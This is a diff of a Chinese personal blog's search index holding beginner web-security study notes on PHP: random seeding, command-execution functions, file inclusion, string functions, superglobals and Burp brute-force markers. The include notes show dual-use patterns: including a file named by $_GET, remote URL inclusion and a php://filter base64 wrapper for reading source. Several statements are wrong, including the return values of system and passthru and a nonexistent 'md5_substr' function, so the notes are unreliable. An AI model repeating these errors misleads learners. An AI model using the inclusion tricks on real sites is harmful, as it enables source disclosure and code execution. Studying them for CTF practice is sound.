       <categories>
-          
-          <category> web安全 </category>
-          
+        <category>php</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 命令执行 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>php随机数的解释</title>
-      <link href="/2025/01/13/php%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E8%A7%A3%E9%87%8A/"/>
-      <url>/2025/01/13/php%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E8%A7%A3%E9%87%8A/</url>
-      
-        <content type="html"><![CDATA[<h4 id="mt-rand-函数对mt-srand-函数的继承"><a href="#mt-rand-函数对mt-srand-函数的继承" class="headerlink" title="mt_rand()函数对mt_srand()函数的继承"></a>mt_rand()函数对mt_srand()函数的继承</h4><p>如图下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 会输出与第一次使用 mt_srand(1) 后 mt_rand() 生成的第一个数相同的数</span></span><br></pre></td></tr></table></figure><p>mt_srand()函数是用来设置随机数种子的，在第一个mt_rand函数调用后,会再次生成一个随机数,<br>在第二个mt_rand函数调用后,会根据第一次的随机数再次生成另一个随机数,以此类推。<br>而到了mt_srand(1)后,随机数种子被重置,<br>所以在第二次使用mt_srand播种后在下面那个mt_rand()调用中,会会生成与第一次生成的随机数相同的数。</p>]]></content>
-      
-      
+      <tags>
+        <tag>php条件函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux基础</title>
+    <url>/2025/01/11/linux%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[]]></content>
       <categories>
-          
-          <category> php </category>
-          
+        <category>Linux</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> php随机数函数 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>php命令执行函数详解</title>
-      <link href="/2025/01/13/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/"/>
-      <url>/2025/01/13/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
-      
-        <content type="html"><![CDATA[<h3 id="首先辨析-system-passthru"><a href="#首先辨析-system-passthru" class="headerlink" title="首先辨析:system,passthru"></a>首先辨析:system,passthru</h3><p>1.对于system和passthru函数.</p><ul><li>共同点:<br>1.都用来执行外部命令<br>2.都会先把命令的执行结果直接输出到标准输出（例如，在网页上显示或者在命令行终端显示）。</li><li>不同点:<br>1.system具有默认返回值,即会返回命令执行结果的最后一行的最后一个字符,<br>2.对于执行命令的状态值,system函数返回的是0表示命令执行成功,其他值表示命令执行失败,<br>3.并且system是必须要写作:</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -l&quot;</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;命令执行状态值为: &quot;</span>.<span class="variable">$return_var</span>;</span><br></pre></td></tr></table></figure><p>即必须要在后面加上一个变量作为命令执行状态值的接收变量,然后通过echo输出命令执行状态值.<br>4.而passthru函数则没有这个要在后面多写一个变量接收命令执行状态值的步骤的规定,它的返回值直接就是0表示命令执行成功,其他值表示命令执行失败.<br><strong>小结:</strong><br>它们最大的区别就是默认的返回值,system函数返回的是命令执行结果的最后一行的最后一个字符<br>而passthru函数则是直接返回命令执行状态.</p><h3 id="shell-exec函数"><a href="#shell-exec函数" class="headerlink" title="shell_exec函数"></a>shell_exec函数</h3><p>执行外部命令，并将命令的输出作为字符串返回，不会自动输出到标准输出，需要手动使用 echo 或其他输出函数进行输出。<br>如果命令执行失败或没有输出，将返回 null。<br>比如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 执行 ls 命令，并存储命令输出</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Output from shell_exec function:\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$output</span>!== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Command failed or no output.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
+      <tags>
+        <tag>基本符号</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php命令执行函数详解</title>
+    <url>/2025/01/13/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<h3 id="首先辨析-system-passthru"><a href="#首先辨析-system-passthru" class="headerlink" title="首先辨析:system,passthru"></a>首先辨析:system,passthru</h3><p>1.对于system和passthru函数.</p>
+<ul>
+<li>共同点:<br>1.都用来执行外部命令<br>2.都会先把命令的执行结果直接输出到标准输出（例如，在网页上显示或者在命令行终端显示）。</li>
+<li>不同点:<br>1.system具有默认返回值,即会返回命令执行结果的最后一行的最后一个字符,<br>2.对于执行命令的状态值,system函数返回的是0表示命令执行成功,其他值表示命令执行失败,<br>3.并且system是必须要写作:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -l&quot;</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;命令执行状态值为: &quot;</span>.<span class="variable">$return_var</span>;</span><br></pre></td></tr></table></figure>
+<p>即必须要在后面加上一个变量作为命令执行状态值的接收变量,然后通过echo输出命令执行状态值.<br>4.而passthru函数则没有这个要在后面多写一个变量接收命令执行状态值的步骤的规定,它的返回值直接就是0表示命令执行成功,其他值表示命令执行失败.<br><strong>小结:</strong><br>它们最大的区别就是默认的返回值,system函数返回的是命令执行结果的最后一行的最后一个字符<br>而passthru函数则是直接返回命令执行状态.</p>
+<h3 id="shell-exec函数"><a href="#shell-exec函数" class="headerlink" title="shell_exec函数"></a>shell_exec函数</h3><p>执行外部命令，并将命令的输出作为字符串返回，不会自动输出到标准输出，需要手动使用 echo 或其他输出函数进行输出。<br>如果命令执行失败或没有输出，将返回 null。<br>比如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 执行 ls 命令，并存储命令输出</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Output from shell_exec function:\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$output</span>!== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Command failed or no output.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
       <categories>
-          
-          <category> php </category>
-          
+        <category>php</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 命令执行函数 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>php字符串处理函数</title>
-      <link href="/2025/01/13/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0/"/>
-      <url>/2025/01/13/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0/</url>
-      
-        <content type="html"><![CDATA[<h4 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr() 函数"></a>substr() 函数</h4><p>语法: substr(string, start, length)<br>功能: 返回字符串的子串，从 start 位置开始，长度为 length。<br>如；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">5</span>); <span class="comment">//输出 &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure><p>如果最后一个参数为1,就是指选中那个位置的字符.<br><strong>补充</strong>: md5_substr() 函数用来处理中文字符串</p><h4 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval() 函数"></a>intval() 函数</h4><p>语法: intval(string)<br>机制:<br>若前缀为0x，则认为是十六进制数；<br>若前缀为0，则认为是八进制数；<br>若没有前缀，则认为是十进制数。<br>最后都是转化为10进制数整数<br>功能: 将字符串转换为整数。<br>如；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;123.456&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$str</span>); <span class="comment">//输出 123</span></span><br></pre></td></tr></table></figure><h4 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace() 函数"></a>str_replace() 函数</h4><p>语法: str_replace(search, replace, subject)<br>功能: 在 subject 中搜索 search，并替换为 replace。</p>]]></content>
-      
-      
+      <tags>
+        <tag>命令执行函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php包含代码机制</title>
+    <url>/2025/01/13/php%E5%8C%85%E5%90%AB%E4%BB%A3%E7%A0%81%E6%9C%BA%E5%88%B6/</url>
+    <content><![CDATA[<h3 id="包含代码机制"><a href="#包含代码机制" class="headerlink" title="包含代码机制"></a>包含代码机制</h3><h4 id="include与echo"><a href="#include与echo" class="headerlink" title="include与echo"></a>include与echo</h4><p>使用 include（或 require 等类似的文件包含函数）包含一个文件时，如果被包含的文件中有 echo 指令，那么 echo 输出的内容会在包含该文件的主文件中显示出来。<br>例如，假设有一个 included_file.php 文件，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is a text&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;included_file.php&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>而在文件include_file.php中，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is included text&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当执行 included_file.php 时，输出结果为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is a text</span><br><span class="line">This is included text</span><br></pre></td></tr></table></figure>
+<p>可以看到，included_file.php 中的 echo 输出内容在主文件中也显示出来了。</p>
+<h4 id="include括号里面的字符类型设置"><a href="#include括号里面的字符类型设置" class="headerlink" title="include括号里面的字符类型设置"></a>include括号里面的字符类型设置</h4><p>include 函数的括号里面的字符类型设置有以下几种：</p>
+<h5 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/path/to/file.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h5 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h5 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;file.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
+<p>包括在其中写入$_GET、$_POST、$_COOKIE、$_SERVER等超全局变量的变量名，也可以包含文件。<br><strong>注意:</strong><br>include和$_GET之间可以没有空格如include$_GET[‘file’]</p>
+<h5 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;http://example.com/remote.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h5 id="php流包装器"><a href="#php流包装器" class="headerlink" title="php流包装器"></a>php流包装器</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=file.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
       <categories>
-          
-          <category> php </category>
-          
+        <category>php</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> php字符串处理函数 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>php包含代码机制</title>
-      <link href="/2025/01/13/php%E5%8C%85%E5%90%AB%E4%BB%A3%E7%A0%81%E6%9C%BA%E5%88%B6/"/>
-      <url>/2025/01/13/php%E5%8C%85%E5%90%AB%E4%BB%A3%E7%A0%81%E6%9C%BA%E5%88%B6/</url>
-      
-        <content type="html"><![CDATA[<h3 id="包含代码机制"><a href="#包含代码机制" class="headerlink" title="包含代码机制"></a>包含代码机制</h3><h4 id="include与echo"><a href="#include与echo" class="headerlink" title="include与echo"></a>include与echo</h4><p>使用 include（或 require 等类似的文件包含函数）包含一个文件时，如果被包含的文件中有 echo 指令，那么 echo 输出的内容会在包含该文件的主文件中显示出来。<br>例如，假设有一个 included_file.php 文件，内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is a text&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;included_file.php&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>而在文件include_file.php中，内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is included text&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当执行 included_file.php 时，输出结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">This is a text</span><br><span class="line">This is included text</span><br></pre></td></tr></table></figure><p>可以看到，included_file.php 中的 echo 输出内容在主文件中也显示出来了。</p><h4 id="include括号里面的字符类型设置"><a href="#include括号里面的字符类型设置" class="headerlink" title="include括号里面的字符类型设置"></a>include括号里面的字符类型设置</h4><p>include 函数的括号里面的字符类型设置有以下几种：</p><h5 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/path/to/file.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h5 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h5 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;file.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>包括在其中写入$_GET、$_POST、$_COOKIE、$_SERVER等超全局变量的变量名，也可以包含文件。<br><strong>注意:</strong><br>include和$_GET之间可以没有空格如include$_GET[‘file’]</p><h5 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;http://example.com/remote.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h5 id="php流包装器"><a href="#php流包装器" class="headerlink" title="php流包装器"></a>php流包装器</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=file.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
+      <tags>
+        <tag>文件包含函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php字符串处理函数</title>
+    <url>/2025/01/13/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h3 id="php字符串处理函数"><a href="#php字符串处理函数" class="headerlink" title="php字符串处理函数"></a>php字符串处理函数</h3><h4 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr() 函数"></a>substr() 函数</h4><p>语法: substr(string, start, length)<br>功能: 返回字符串的子串，从 start 位置开始，长度为 length。<br>如；</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">5</span>); <span class="comment">//输出 &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure>
+<p>如果最后一个参数为1,就是指选中那个位置的字符.<br><strong>补充</strong>: md5_substr() 函数用来处理中文字符串</p>
+<p>特性:<br>1.如果在substr()第一个位置里面写入的值为一个文件名,那么substr是读取&#x2F;截取的这个文件本身名字的一部分,并非文件内部代码的一部分。</p>
+<h4 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval() 函数"></a>intval() 函数</h4><p>语法: intval(string)<br><strong>机制1</strong>:<br>若前缀为0x，则认为是十六进制数；<br>若前缀为0，则认为是八进制数；<br>若没有前缀，则认为是十进制数。<br>最后都是转化为10进制数整数<br><strong>机制2:</strong><br>对于第二个参数:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo intval(123.12,0)</span><br></pre></td></tr></table></figure>
+<p>为0,则自动检测进制,最终都是把第一个参数转换为10进制整数;<br>为2,8,16则为对应进制的数。<br><strong>功能</strong>: 将字符串转换为整数。<br>如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;123.456&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$str</span>); <span class="comment">//输出 123</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace() 函数"></a>str_replace() 函数</h4><p>语法: str_replace(search, replace, subject)<br>功能: 在 subject 中搜索 search，并替换为 replace。</p>
+<h4 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a>strpos()函数</h4><p>语法:strpos(string,find,start)<br>最后的start是可选,规定了开始的位置。</p>
+]]></content>
       <categories>
-          
-          <category> php </category>
-          
+        <category>php</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 文件包含函数 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>bp爆破中的变量赋值</title>
-      <link href="/2025/01/13/bp%E7%88%86%E7%A0%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/"/>
-      <url>/2025/01/13/bp%E7%88%86%E7%A0%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/</url>
-      
-        <content type="html"><![CDATA[<h3 id="有关密码用户名的提交"><a href="#有关密码用户名的提交" class="headerlink" title="有关密码用户名的提交"></a>有关密码用户名的提交</h3><ul><li>密码提交：<br>比如在web容器内部有输入框让你输入admin和密码,这些数据提交进去是在HTTP请求报文或HTTP请求头中的Authorization结构(用于身份验证和授权信息传递),<br>可以发现admin与password之间使用:隔开,并且注意编码格式。</li><li>变量赋值的提醒<br>变量赋值是用$$分开的,两个$符号之间的字符即为变量的值,比如:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic §a§:§password§</span><br></pre></td></tr></table></figure><p><strong>注释</strong>:这里把冒号放在a变量里面:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic $a:$$password$</span><br></pre></td></tr></table></figure><p>也符合HTTP协议的格式。怎么顺眼怎么来</p>]]></content>
-      
-      
+      <tags>
+        <tag>php字符串处理函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php比较字符1</title>
+    <url>/2025/01/11/php%E6%AF%94%E8%BE%83%E5%AD%97%E7%AC%A61/</url>
+    <content><![CDATA[]]></content>
       <categories>
-          
-          <category> web安全 </category>
-          
+        <category>php</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> bp爆破 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>php比较字符1</title>
-      <link href="/2025/01/11/php%E6%AF%94%E8%BE%83%E5%AD%97%E7%AC%A61/"/>
-      <url>/2025/01/11/php%E6%AF%94%E8%BE%83%E5%AD%97%E7%AC%A61/</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-      
+      <tags>
+        <tag>php比较字符</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php超全局变量特性注解</title>
+    <url>/2025/01/14/php%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/</url>
+    <content><![CDATA[<h3 id="php超全局变量特性注解"><a href="#php超全局变量特性注解" class="headerlink" title="php超全局变量特性注解"></a>php超全局变量特性注解</h3><h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h4><p>1.它最大的特点就是,$_REQUEST超全局变量为一个复合变量,它可以接受来自于$_GET、$_POST 和 $_COOKIE 传递过来的值。<br>2.它的设计初衷是为了方便开发者在处理用户输入时，无需关心数据是通过哪种方式提交的，都能统一获取。<br>3.所以如下:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">&quot;file&quot;</span>];</span><br></pre></td></tr></table></figure>
+<p>我们直接在url里面加上:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=xxx</span><br></pre></td></tr></table></figure>
+<p>就可以让$_REQUEST变量接收到传递的参数。</p>
+]]></content>
       <categories>
-          
-          <category> php </category>
-          
+        <category>php</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> php比较字符 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>linux基础</title>
-      <link href="/2025/01/11/linux%E5%9F%BA%E7%A1%80/"/>
-      <url>/2025/01/11/linux%E5%9F%BA%E7%A1%80/</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-      
+      <tags>
+        <tag>php超全局变量</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php随机数的解释</title>
+    <url>/2025/01/13/php%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E8%A7%A3%E9%87%8A/</url>
+    <content><![CDATA[<h4 id="mt-rand-函数对mt-srand-函数的继承"><a href="#mt-rand-函数对mt-srand-函数的继承" class="headerlink" title="mt_rand()函数对mt_srand()函数的继承"></a>mt_rand()函数对mt_srand()函数的继承</h4><p>如图下:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 输出另一个随机数</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">// 会输出与第一次使用 mt_srand(1) 后 mt_rand() 生成的第一个数相同的数</span></span><br></pre></td></tr></table></figure>
+<p>mt_srand()函数是用来设置随机数种子的，在第一个mt_rand函数调用后,会再次生成一个随机数,<br>在第二个mt_rand函数调用后,会根据第一次的随机数再次生成另一个随机数,以此类推。<br>而到了mt_srand(1)后,随机数种子被重置,<br>所以在第二次使用mt_srand播种后在下面那个mt_rand()调用中,会会生成与第一次生成的随机数相同的数。</p>
+]]></content>
       <categories>
-          
-          <category> Linux </category>
-          
+        <category>php</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 基本符号 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>sql常规注入</title>
-      <link href="/2025/01/11/sql%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5/"/>
-      <url>/2025/01/11/sql%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5/</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-      
+      <tags>
+        <tag>php随机数函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一句话木马简单例题web80</title>
+    <url>/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
